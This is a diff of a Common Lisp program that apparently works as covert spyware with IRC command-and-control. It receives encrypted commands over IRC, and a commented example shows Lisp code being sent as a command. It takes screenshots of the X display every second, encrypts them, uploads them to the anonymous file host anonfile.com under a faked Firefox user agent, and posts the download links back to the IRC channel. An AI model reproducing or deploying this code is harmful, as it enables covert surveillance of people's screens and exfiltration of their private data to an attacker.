@@ -7,7 +7,9 @@
 (ql:quickload "cl-base64")
 (ql:quickload "prbs")
 (ql:quickload "cl-irc")
+(ql:quickload "cl-json")
 
+;; may be not needed
 (defun get-png-obj (width height image &optional (color-type :truecolor-alpha))
   (let* ((png (make-instance 'zpng:png :width width :height height
                              :color-type color-type))
@@ -207,14 +209,11 @@
     (base64:usb8-array-to-base64-string enc)))
 
 (defun decrypt (base64 seed)
-  (handler-case
-      (let* ((oct (base64:base64-string-to-usb8-array base64))
-             (gen (prbs:byte-gen 31 :seed seed))
-             (len (length oct))
-             (gam (funcall gen len))
-             (cmd (seq-xor len oct gam)))
-        (flex:octets-to-string cmd :external-format :utf-8))
-    (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
+  (let* ((oct (base64:base64-string-to-usb8-array base64))
+         (gen (prbs:byte-gen 31 :seed seed))
+         (len (length oct))
+         (gam (funcall gen len)))
+    (seq-xor len oct gam)))
 
 (defmacro bprint (var)
   `(subseq (with-output-to-string (*standard-output*)
@@ -225,10 +224,10 @@
     (block irc-cmd-block
       (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
              (src  (CL-IRC:SOURCE param))
-             (seed (handler-case (parse-integer (subseq src 1))
-                    (SB-INT:SIMPLE-PARSE-ERROR ()
-                      (return-from irc-cmd-block nil))))
-             (str (decrypt msg seed)))
+             (oct  (decrypt msg *irc-sess*))
+             (str  (handler-case
+                       (flex:octets-to-string oct :external-format :utf-8)
+                     (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil))))
         (format t "~%::COMMAND::~A::" msg)
         (format t "~%::SOURCE::~A::" src)
         (format t "~%::str::~A::" str)
@@ -241,10 +240,13 @@
 ;;  (flex:string-to-octets
 ;;   "(defun snd () (bt:with-lock-held (*irc-lock*) (cl-irc:privmsg *irc-conn* *irc-chan* (format nil \"nfo:error\"))))"
 ;;   :external-format :utf-8)
-;;   3783969158)
+;;  3783987858)
 
 ;; (encrypt
-;;  "(snd)" 3783969158)
+;;  (flex:string-to-octets
+;;   "(snd)"
+;;   :external-format :utf-8)
+;;  3783987858)
 
 (defun irc-msg-hook (param)
   "MUST return T for stop hooks processing"
@@ -252,10 +254,10 @@
   t)
 (defun irc-join ()
   (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
-  (sleep 3)
+  (sleep 1)
   (bt:with-lock-held (*irc-lock*)
     (cl-irc:join *irc-conn* *irc-chan*))
-  (sleep 3)
+  (sleep 1)
   (bt:with-lock-held (*irc-lock*)
     (cl-irc:privmsg
      *irc-conn* *irc-chan*
@@ -456,49 +458,141 @@
 ;;              (format nil "~A" (gensym "FILE"))
 ;;              unpack
 ;;              :grayscale)))
+(setf drakma:*header-stream* *standard-output*)
+
+(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")
+
+(defparameter *additional-headers*
+  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
+    ("Accept-Charset" . "utf-8")))
+
+(defun get-csrf (text)
+  (loop :for str :in (split-sequence:split-sequence #\Newline text)
+     :do (multiple-value-bind (match-p result)
+             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
+           (when match-p (return (aref result 0))))))
+
+(defun get-cookies-alist (cookie-jar)
+  "Получаем alist с печеньками из cookie-jar"
+  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
+       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))
+
+(defun anon-file-upload (filename content)
+  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
+    ;; load mainpage for cookies, headers and csrf
+    (multiple-value-bind (body-or-stream status-code headers
+                                         uri stream must-close reason-phrase)
+        (drakma:http-request "https://anonfile.com/"
+                             :user-agent *user-agent*
+                             :redirect 10
+                             :force-binary t
+                             :cookie-jar cookie-jar
+                             :additional-headers *additional-headers*)
+      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
+             (csrf (get-csrf text))
+             (boundary "---------------------------196955623314664815241571979859")
+             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
+             (new-headers `(("Accept" . "application/json")
+                            ("Accept-Language" . "en-US,en;q=0.5")
+                            ("Cache-Control" . "no-cache")
+                            ("X-Requested-With" . "XMLHttpRequest")
+                            ("X-CSRF-Token" . ,csrf)
+                            ("Origin" . "https://anonfile.com")
+                            ("Referer" . "https://anonfile.com/")
+                            ("Content-Type" . ,type-header)
+                            ("TE" . "Trailers"))))
+        (multiple-value-bind (body-or-stream status-code headers
+                                             uri stream must-close reason-phrase)
+            (drakma:http-request
+             "https://api.anonfile.com/upload"
+             ;; "http://localhost:9993/upload"
+             :user-agent *user-agent*
+             :method :post
+             :form-data t
+             :content (format nil "--~A
+Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
+Content-Type: application/octet-stream
+
+~A
+--~A--" boundary filename content boundary)
+             :cookie-jar cookie-jar
+             :additional-headers new-headers
+             :force-binary t)
+          (flex:octets-to-string body-or-stream :external-format :utf-8))))))
+
+;; (anon-file-upload "555f.txt" "the content")
+
+
+;; (alexandria:write-string-into-file
+;;  (cl-base64:usb8-array-to-base64-string
+;;   (alexandria:read-file-into-byte-vector #P"png.png"))
+;;  #P"test.txt" :if-exists :supersede :external-format :utf-8)
+
+;; (alexandria:write-byte-vector-into-file
+;;  (cl-base64:base64-string-to-usb8-array
+;;   (alexandria:read-file-into-string #P"test.txt" :external-format :utf-8))
+;;  #P"test2" :if-exists :supersede)
+
+
+;; (print (get-cookies-alist cookie-jar))
+;; (print headers)
+;; (setf drakma" . "drakma-default-external-format* :UTF-8)
+
+;; (in-package :rigidus)
+
+;; (ql:quickload "rigidus")
+
+;; (restas:define-route upload ("/upload")
+;;   "<form enctype=\"multipart/form-data\" method=\"post\">
+;;    <input type=\"file\" name=\"file\">
+;;    <input type=\"submit\" value=\"Отправить\">
+;;    </form>")
+
+;; (restas:define-route upload-post ("/upload" :method :post)
+;;   (let ((file-info (hunchentoot:post-parameter "file")))
+;;     ;; (hunchentoot:escape-for-html
+;;     ;;  (alexandria:read-file-into-string (first file-info)))
+;;     (format nil "~A"
+;;             (bprint file-info))))
 
 (defun save (frmt-filename-str dims image)
-  (let* ((height (car  dims))
-         (width  (* 8 (cadr dims)))
-         (unpacked-image (unpack-image image))
-         (png (get-png-obj width height unpacked-image :grayscale))
-         (png-seq (get-png-sequence png))
-         (png-len (length png-seq))
-         (base64encrypted (encrypt png-seq *irc-sess*))
-         ;; (seed (get-universal-time))
-         ;; (encoder (prbs:byte-gen 31 :seed seed))
-         ;; (enc-gamma (funcall encoder png-len))
-         ;; (encoded (seq-xor png-len png-seq enc-gamma))
-         ;; (base64 (cl-base64:usb8-array-to-base64-string encoded))
-         (base64 base64encrypted)
-         (unbase64 (cl-base64:base64-string-to-usb8-array base64))
-         (decoder (prbs:byte-gen 31 :seed *irc-sess*))
-         (dec-gamma (funcall decoder png-len))
-         (decoded (seq-xor (length unbase64) unbase64 dec-gamma))
-         (unk-filename (format nil frmt-filename-str
-                               (format nil "~A-~A-~A-"
-                                       (gensym) *irc-sess* png-len))))
-    ;; (alexandria:write-string-into-file
-    ;;  base64 unk-filename :if-exists :supersede  :external-format :utf-8)
-    (with-open-file (file-stream unk-filename
+  (let* ((height     (car  dims))
+         (width      (cadr dims))
+         (png        (get-png-obj width height image :grayscale))
+         (png-seq    (get-png-sequence png))
+         (base64     (encrypt png-seq *irc-sess*))
+         (decoded    (decrypt base64 *irc-sess*))
+         (filename   (format nil frmt-filename-str
+                             (format nil "~A" (get-universal-time))))
+         (upload-ret (cl-json:decode-json-from-string
+                      (anon-file-upload filename base64)))
+         (link       (if (cdr (assoc :status upload-ret))
+                         (subseq (cdadr (cadadr (assoc :data upload-ret))) 20)
+                         nil))
+         (full-filename (format nil "FILE_~A_~A"
+                                *irc-sess*
+                                filename)))
+    (finish-output)
+    (with-open-file (file-stream full-filename
                                  :direction :output
                                  :if-exists :supersede
                                  :if-does-not-exist :create
                                  :element-type '(unsigned-byte 8))
       (write-sequence decoded file-stream)
-      (cl-irc:privmsg *irc-conn* *irc-chan* "qwe"))
-    ))
-
+      (cl-irc:privmsg *irc-conn* *irc-chan*
+                      (if link
+                          link
+                          upload-ret)))))
 
 (let ((prev)
       (cnt 9999))
   (defun shot ()
-    (format t "~%::shot-func")
     (let* ((snap (pack-image (x-snapshot)))
            (dims (array-dimensions snap)))
       (if (> cnt 4)
           (progn
-            (save "FILE~A" dims snap)
+            (save "~A" dims snap)
             (setf prev snap)
             (setf cnt 0))
           ;; else
@@ -512,10 +606,11 @@
                 (setf (aref xored qy qx)
                       (logxor (aref prev qy qx)
                               (aref snap qy qx)))))
-            (save "FILE~ADIFF" dims xored)
+            (save (format nil "~~A_~A" cnt) dims xored)
             (setf prev snap)
             (incf cnt))))
     (sleep 1)
-    (shot)))
+    ;; (shot)
+    ))
 
 (shot)
